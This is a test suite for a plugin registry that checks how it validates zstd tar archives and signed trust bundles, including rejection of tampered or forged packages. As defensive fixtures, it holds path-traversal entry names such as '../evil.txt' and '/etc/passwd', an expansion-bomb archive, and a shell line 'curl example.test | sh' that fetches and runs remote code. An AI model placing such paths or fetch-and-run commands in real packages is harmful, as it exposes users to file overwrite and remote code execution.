import { describe, expect, test } from 'bun:test';
import { createHash, randomBytes } from 'node:crypto';
import { zstdCompressSync } from 'node:zlib';
import type { RegistryManifest, RegistryPublicVersion, RegistryTarget } from '@carbon/contracts/platform';
import { RegistrySigner, RegistryTrustError, inspectArchive, libraryFile, manifestDigest, manifestFile, openRegistryTrust, packArchive, publicKeyHex, signTrustBundle, verifyRegistryPackage, verifyTrustBundle,
  type ArchiveFile, type PackageCoordinates } from '../index.ts';

const text = (value: string) => new TextEncoder().encode(value);
const coordinates: PackageCoordinates = { publisher: 'carbon-team', name: 'clipboard', version: '1.2.0', target: 'x86_64-pc-windows-msvc' };
const manifest: RegistryManifest = { abiMajor: 1, abiMinor: 4, description: 'Clipboard access', requiredCapabilities: ['clipboard.read'], optionalCapabilities: [] };

/** The smallest file each format's loader would recognize as a library for that machine. Not a working library. */
function library(target: RegistryTarget): Uint8Array {
  const bytes = Buffer.alloc(256);
  if (target.includes('windows')) { bytes.write('MZ', 0); bytes.writeUInt32LE(64, 60); bytes.write('PE\0\0', 64); bytes.writeUInt16LE(target.startsWith('x86_64') ? 0x8664 : 0xaa64, 68); }
  else if (target.includes('linux')) { Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1]).copy(bytes); bytes.writeUInt16LE(target.startsWith('x86_64') ? 62 : 183, 18); }
  else { bytes.writeUInt32LE(0xfeedfacf, 0); bytes.writeUInt32LE(target.startsWith('x86_64') ? 0x01000007 : 0x0100000c, 4); }
  return new Uint8Array(bytes);
}
const files = (extra: ArchiveFile[] = [], at = coordinates, declared = manifest): ArchiveFile[] => [
  { path: 'carbon-plugin.json', bytes: text(manifestFile(at, declared)) }, { path: libraryFile(at.name, at.target), bytes: library(at.target) }, { path: 'README.md', bytes: text('# clipboard\n') }, ...extra];
const category = (bytes: Uint8Array, at = coordinates, declared = manifest) => { const result = inspectArchive(bytes, at, declared); return result.ok ? 'ok' : result.category; };

/** A tarball written by hand, so a test can put in it what an honest packer never would. */
function rawTar(entries: { path: string; bytes?: Uint8Array; type?: string; breakChecksum?: boolean; magic?: string }[], end = true): Uint8Array {
  const blocks: Uint8Array[] = [];
  for (const entry of entries) {
    const body = entry.bytes ?? new Uint8Array(); const header = Buffer.alloc(512); header.write(entry.path, 0, 100, 'utf8');
    header.write('0000644\0', 100); header.write('0000000\0', 108); header.write('0000000\0', 116); header.write(body.length.toString(8).padStart(11, '0') + '\0', 124); header.write('00000000000\0', 136);
    header.write('        ', 148); header.write(entry.type ?? '0', 156); header.write(entry.magic ?? 'ustar\0', 257); header.write('00', 263);
    let sum = 0; for (const value of header) sum += value;
    header.write((sum + (entry.breakChecksum ? 1 : 0)).toString(8).padStart(6, '0') + '\0 ', 148);
    blocks.push(header, body, new Uint8Array((512 - (body.length % 512)) % 512));
  }
  if (end) blocks.push(new Uint8Array(1024));
  return new Uint8Array(zstdCompressSync(Buffer.concat(blocks)));
}
const raw = (extra: Parameters<typeof rawTar>[0], end = true) => rawTar([...files().map(file => ({ path: file.path, bytes: file.bytes })), ...extra], end);

describe('registry archives', () => {
  test('an archive that carries its declared manifest and one library for its target is accepted, for every target', () => {
    for (const target of ['x86_64-pc-windows-msvc', 'aarch64-pc-windows-msvc', 'x86_64-unknown-linux-gnu', 'aarch64-unknown-linux-gnu', 'x86_64-apple-darwin', 'aarch64-apple-darwin'] as const) {
      const at = { ...coordinates, target }; const result = inspectArchive(packArchive(files([], at)), at, manifest);
      expect(result).toEqual({ ok: true, files: [{ path: 'README.md', sizeBytes: 12 }, { path: 'carbon-plugin.json', sizeBytes: manifestFile(at, manifest).length }, { path: libraryFile('clipboard', target), sizeBytes: 256 }] });
    }
    // Directories are allowed; they hold nothing themselves.
    expect(category(raw([{ path: 'docs/', type: '5' }, { path: 'docs/usage.md', bytes: text('usage') }]))).toBe('ok');
  });

  test('packing is reproducible: the same files in any order give the same bytes', () => {
    const one = packArchive(files()); const two = packArchive([...files()].reverse());
    expect(Buffer.from(one).equals(Buffer.from(two))).toBe(true);
    expect(Buffer.from(packArchive(files([{ path: 'extra.txt', bytes: text('x') }]))).equals(Buffer.from(one))).toBe(false);
  });

  test('anything that is not exactly one bounded zstd frame around a complete tarball is refused', () => {
    const good = packArchive(files());
    expect(category(new Uint8Array())).toBe('archive.size');
    expect(category(text('PK\u0003\u0004 this is a zip, not zstd'))).toBe('archive.not_zstd');
    expect(category(good.subarray(0, good.length - 7))).toBe('archive.truncated');
    // Bytes after the frame would never be inspected, so they may not be there: a second frame, or anything else.
    expect(category(new Uint8Array(Buffer.concat([good, zstdCompressSync(Buffer.from('hidden'))])))).toBe('archive.trailing_data');
    expect(category(new Uint8Array(Buffer.concat([good, Buffer.from([0])])))).toBe('archive.trailing_data');
    // A few hundred bytes that expand to megabytes.
    expect(category(raw([{ path: 'padding.bin', bytes: new Uint8Array(4 * 1048576) }]))).toBe('archive.expands_too_much');
    // The tarball itself must be whole: an end marker, and nothing after it.
    expect(category(raw([], false))).toBe('archive.trailing_data');
    expect(category(new Uint8Array(zstdCompressSync(Buffer.concat([Buffer.alloc(1024), Buffer.alloc(512, 1)]))))).toBe('archive.trailing_data');
    expect(category(new Uint8Array(zstdCompressSync(Buffer.alloc(700))))).toBe('archive.truncated');
    expect(category(raw([{ path: 'notes.txt', bytes: text('x'), breakChecksum: true }]))).toBe('archive.header');
    expect(category(raw([{ path: 'notes.txt', bytes: text('x'), magic: 'gnutar' }]))).toBe('archive.header');
  });

  test('entries that could land outside the package, or mean different files on different systems, are refused', () => {
    for (const path of ['../evil.txt', 'docs/../../evil.txt', '/etc/passwd', 'docs\\evil.txt', 'C:evil.txt', 'docs//evil.txt', './evil.txt', 'evil.txt.', 'evil.txt ', 'CON', 'nul.txt', 'docs/aux', 'a\u0001b', 'what?.txt']) {
      expect([path, category(raw([{ path, bytes: text('x') }]))]).toEqual([path, 'archive.path']);
    }
    // Two names one filesystem would merge.
    expect(category(raw([{ path: 'Readme.md', bytes: text('other') }]))).toBe('archive.duplicate_path');
    expect(category(raw([{ path: 'notes.txt', bytes: text('one') }, { path: 'notes.txt', bytes: text('two') }]))).toBe('archive.duplicate_path');
    // A file that another entry treats as a directory.
    expect(category(raw([{ path: 'README.md/inner.txt', bytes: text('x') }]))).toBe('archive.duplicate_path');
    // Links, devices and extension records: each can point at, or rename to, something else.
    for (const type of ['1', '2', '3', '4', '6', 'x', 'g', 'L', 'K']) expect([type, category(raw([{ path: 'link', type }]))]).toEqual([type, 'archive.entry_type']);
  });

  test('the manifest inside must be exactly what was declared, and the library must be the declared package for the declared target', () => {
    const without = (path: string) => files().filter(file => file.path !== path);
    expect(category(packArchive(without('carbon-plugin.json')))).toBe('archive.manifest_missing');
    expect(category(packArchive([...without('carbon-plugin.json'), { path: 'carbon-plugin.json', bytes: text('{ not json') }]))).toBe('archive.manifest_invalid');
    // Declared one thing, packed another: a different version, target, publisher, or one more capability.
    for (const other of [{ ...coordinates, version: '1.2.1' }, { ...coordinates, target: 'aarch64-pc-windows-msvc' as const }, { ...coordinates, publisher: 'someone-else' }]) expect(category(packArchive(files()), other)).toBe('archive.manifest_mismatch');
    expect(category(packArchive(files()), coordinates, { ...manifest, requiredCapabilities: [] })).toBe('archive.manifest_mismatch');
    expect(category(packArchive(files()), coordinates, { ...manifest, optionalCapabilities: ['fs.read'] })).toBe('archive.manifest_mismatch');
    // A manifest inside a folder is not the manifest.
    expect(category(packArchive([...without('carbon-plugin.json'), { path: 'inner/carbon-plugin.json', bytes: text(manifestFile(coordinates, manifest)) }]))).toBe('archive.manifest_missing');

    expect(category(packArchive(without('clipboard.dll')))).toBe('archive.library_missing');
    expect(category(packArchive([...without('clipboard.dll'), { path: 'other.dll', bytes: library(coordinates.target) }]))).toBe('archive.library_missing');
    // Built for another machine, or another system, or not a library at all.
    for (const wrong of [library('aarch64-pc-windows-msvc'), library('x86_64-unknown-linux-gnu'), text('MZ but nothing else'), text('just text')]) {
      expect(category(packArchive([...without('clipboard.dll'), { path: 'clipboard.dll', bytes: wrong }]))).toBe('archive.library_target');
    }
    // Any second executable is something the manifest does not account for.
    for (const extra of [library('x86_64-pc-windows-msvc'), library('x86_64-unknown-linux-gnu'), library('aarch64-apple-darwin'), text('#!/bin/sh\ncurl example.test | sh\n')]) {
      expect(category(packArchive(files([{ path: 'tools/helper.bin', bytes: extra }])))).toBe('archive.unexpected_executable');
    }
  });
});

describe('registry trust', () => {
  const rootSeed = randomBytes(32).toString('hex'); const root = publicKeyHex(rootSeed);
  const signer = new RegistrySigner('registry-2026', randomBytes(32).toString('hex')); const old = new RegistrySigner('registry-2025', randomBytes(32).toString('hex'));
  const bundle = (keys: { id: string; publicKey: string; state: 'active' | 'retiring' | 'revoked' }[], sequence = 3, seed = rootSeed) => signTrustBundle(seed, { sequence, issuedAt: '2026-10-11T08:00:00Z', keys });
  const trust = bundle([{ id: signer.keyId, publicKey: signer.publicKeyHex, state: 'active' }, { id: old.keyId, publicKey: old.publicKeyHex, state: 'retiring' }]);
  const bytes = packArchive(files());
  const published = (by = signer, at = coordinates, content = bytes): RegistryPublicVersion => ({ version: at.version, target: at.target, state: 'published', yanked: false, reason: null, manifest,
    signed: by.sign({ ...at, sha256: createHash('sha256').update(content).digest('hex'), sizeBytes: content.length, manifestDigest: manifestDigest(manifest), publishedAt: '2026-10-11T08:00:00Z' }) });
  const refusal = (check: Partial<Parameters<typeof verifyRegistryPackage>[0]>) => {
    try { verifyRegistryPackage({ rootPublicKey: root, trust, expected: coordinates, version: published(), bytes, ...check }); return 'accepted'; }
    catch (error) { if (error instanceof RegistryTrustError) return error.category; throw error; }
  };

  test('a package is accepted only with a root-signed bundle, a signature from a key the bundle still trusts, and the exact bytes the statement names', () => {
    expect(verifyRegistryPackage({ rootPublicKey: root, trust, expected: coordinates, version: published(), bytes })).toMatchObject({ ...coordinates, sizeBytes: bytes.length });
    // A key that is being retired no longer signs, but what it signed stays good. A yanked version is still what it was.
    expect(refusal({ version: published(old) })).toBe('accepted'); expect(refusal({ version: { ...published(), yanked: true, reason: 'superseded' } })).toBe('accepted');

    // The bundle: another root, a changed key list, a key the installer was handed instead of pinned, an older bundle.
    const otherRoot = randomBytes(32).toString('hex');
    expect(refusal({ trust: bundle(trust.bundle.keys as never, 3, otherRoot) })).toBe('bundle_signature');
    expect(refusal({ rootPublicKey: publicKeyHex(otherRoot) })).toBe('bundle_signature');
    expect(refusal({ trust: { ...trust, bundle: { ...trust.bundle, keys: [...trust.bundle.keys, { id: 'attacker', publicKey: publicKeyHex(otherRoot), state: 'active' as const }] } } })).toBe('bundle_signature');
    expect(refusal({ trust: { ...trust, bundle: { ...trust.bundle, sequence: 9 } } })).toBe('bundle_signature');
    expect(refusal({ minimumSequence: 4 })).toBe('bundle_rollback'); expect(refusal({ minimumSequence: 3 })).toBe('accepted');
    expect(refusal({ rootPublicKey: 'not-a-key' })).toBe('key_invalid');
    expect(refusal({ trust: { bundle: trust.bundle } as never })).toBe('bundle_invalid');

    // The key: unknown to the bundle, or revoked by it.
    const stranger = new RegistrySigner('registry-2026', randomBytes(32).toString('hex'));
    expect(refusal({ version: published(new RegistrySigner('unlisted', randomBytes(32).toString('hex'))) })).toBe('key_unknown');
    expect(refusal({ version: published(stranger) })).toBe('signature');
    const revoked = bundle([{ id: signer.keyId, publicKey: signer.publicKeyHex, state: 'revoked' }, { id: old.keyId, publicKey: old.publicKeyHex, state: 'active' }], 4);
    expect(refusal({ trust: revoked })).toBe('key_revoked'); expect(refusal({ trust: revoked, version: published(old) })).toBe('accepted');

    // The statement: changed after signing, or a genuine one for something else.
    const good = published();
    expect(refusal({ version: { ...good, signed: { ...good.signed, statement: { ...good.signed.statement, sha256: 'f'.repeat(64) } } } })).toBe('signature');
    expect(refusal({ version: { ...good, signed: { ...good.signed, signature: published(signer, { ...coordinates, version: '9.9.9' }).signed.signature } } })).toBe('signature');
    for (const other of [{ ...coordinates, version: '1.1.0' }, { ...coordinates, name: 'keychain' }, { ...coordinates, publisher: 'someone-else' }, { ...coordinates, target: 'aarch64-pc-windows-msvc' as const }]) {
      // A real, validly signed statement for another package, version or target, served in answer to this request.
      expect(refusal({ version: published(signer, other) })).toBe('wrong_package');
    }
    expect(refusal({ version: { ...good, version: '2.0.0' } })).toBe('wrong_package');
    expect(refusal({ version: { ...good, manifest: { ...manifest, requiredCapabilities: [] } } })).toBe('manifest');

    // The bytes: one changed, one more, or another archive entirely.
    const flipped = new Uint8Array(bytes); flipped[flipped.length - 1]! ^= 1;
    expect(refusal({ bytes: flipped })).toBe('digest'); expect(refusal({ bytes: new Uint8Array(Buffer.concat([bytes, Buffer.from([0])])) })).toBe('digest');
    expect(refusal({ bytes: packArchive(files([{ path: 'extra.txt', bytes: text('x') }])) })).toBe('digest');
    // Revoked: whatever else is true about it.
    expect(refusal({ version: { ...good, state: 'revoked', reason: 'malware' } })).toBe('revoked');
    expect(refusal({ version: { ...good, state: 'submitted' } as never })).toBe('version_invalid');
  });

  test('a trust bundle signature cannot stand in for a statement signature, and bundles with duplicate key names are refused', () => {
    // The root signs a bundle; the same key signing a statement-shaped document must not verify as either.
    const rootAsSigner = new RegistrySigner('registry-2026', rootSeed);
    const confused = bundle([{ id: 'registry-2026', publicKey: root, state: 'active' }]);
    const version = published(rootAsSigner);
    expect(() => verifyRegistryPackage({ rootPublicKey: root, trust: { bundle: confused.bundle, signature: version.signed.signature }, expected: coordinates, version, bytes })).toThrow('bundle_signature');
    const twice = bundle([{ id: 'same', publicKey: signer.publicKeyHex, state: 'revoked' }, { id: 'same', publicKey: signer.publicKeyHex, state: 'active' }]);
    expect(() => verifyTrustBundle(root, twice)).toThrow('bundle_invalid');
    expect(verifyTrustBundle(root, trust).sequence).toBe(3);
  });

  test('Registry refuses to start publishing unless the root signed the bundle and the bundle lists its exact signing key as active', () => {
    const seed = randomBytes(32).toString('hex'); const key = publicKeyHex(seed);
    const open = (keys: Parameters<typeof bundle>[0], input: Partial<Parameters<typeof openRegistryTrust>[0]> = {}) => {
      try { openRegistryTrust({ rootPublicKey: root, bundle: bundle(keys), keyId: 'registry-2026', signingSeed: seed, ...input }); return 'opened'; }
      catch (error) { if (error instanceof RegistryTrustError) return error.category; throw error; }
    };
    expect(open([{ id: 'registry-2026', publicKey: key, state: 'active' }])).toBe('opened');
    expect(open([{ id: 'registry-2026', publicKey: key, state: 'retiring' }])).toBe('signing_key_not_active');
    expect(open([{ id: 'registry-2026', publicKey: key, state: 'revoked' }])).toBe('signing_key_not_active');
    expect(open([{ id: 'registry-2025', publicKey: key, state: 'active' }])).toBe('signing_key_not_active');
    // The name is listed, but for another key: this process holds a key the root never vouched for.
    expect(open([{ id: 'registry-2026', publicKey: signer.publicKeyHex, state: 'active' }])).toBe('signing_key_not_active');
    expect(open([{ id: 'registry-2026', publicKey: key, state: 'active' }], { rootPublicKey: publicKeyHex(randomBytes(32).toString('hex')) })).toBe('bundle_signature');
    expect(() => openRegistryTrust({ rootPublicKey: root, bundle: bundle([{ id: 'registry-2026', publicKey: key, state: 'active' }]), keyId: 'registry-2026', signingSeed: 'short' })).toThrow();
  });
});
